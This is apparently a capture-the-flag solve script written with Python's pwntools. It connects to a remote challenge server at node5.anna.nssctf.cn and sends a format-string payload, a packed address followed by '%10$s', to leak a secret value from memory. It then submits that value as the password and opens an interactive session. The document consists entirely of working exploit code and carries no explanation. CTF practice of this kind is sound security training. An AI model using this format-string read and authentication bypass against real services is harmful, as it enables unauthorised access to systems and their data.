from pwn import *

io = remote(b"node5.anna.nssctf.cn", 21904)

context.log_level = 'info'

key = 0x804C044 # dword
#gdb.attach(io)
# offset=10
payload = p32(key) + b"%10$s"
io.recvuntil(b"your name:")
io.sendline(payload)
io.recvuntil(b"Hello," + p32(key))
secret = (u32(io.recv(4)))
print("secret=", hex(secret))

io.recvuntil(b"your passwd:")
io.send(str(secret).encode())
io.interactive()


